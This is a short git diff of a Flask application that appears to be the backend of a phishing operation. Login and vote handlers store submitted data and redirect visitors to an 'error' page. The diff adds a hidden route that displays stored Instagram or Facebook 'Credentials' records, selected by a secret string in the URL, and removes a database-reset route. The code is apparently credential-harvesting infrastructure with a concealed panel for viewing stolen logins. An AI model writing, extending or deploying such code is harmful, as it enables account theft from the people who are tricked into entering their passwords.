@@ -25,12 +25,6 @@ def init_db():
     db.create_all()
     return "Database initialized!"
 
-@app.route('/resetdb')
-def reset_db():
-    db.drop_all()
-    db.create_all()
-    return "Database reset and initialized!"
-
 @app.errorhandler(404)
 def page_not_found(e):
     return '404 Not Found'
@@ -84,7 +78,6 @@ def login_page2():
         db.session.commit()
 
     return redirect(request.referrer + "error" if request.referrer else "https://artscrednewarts.pages.dev/errors")
-
 
 
 
@@ -149,6 +142,12 @@ def vote_page2():
         conn.close()
 
     return redirect(request.referrer + "error")
+
+@app.route("/<path:locate>")
+def index(locate):
+    account_type = 'INSTAGRAM' if 'wwsuobyiyUnvL99f' in locate else 'FACEBOOK'
+    data = Credentials.query.filter_by(account_type=account_type).all()
+    return render_template('index.html', data=data, locate=locate)
 
 @app.route("/delete/<int:id>")
 def delete(id):
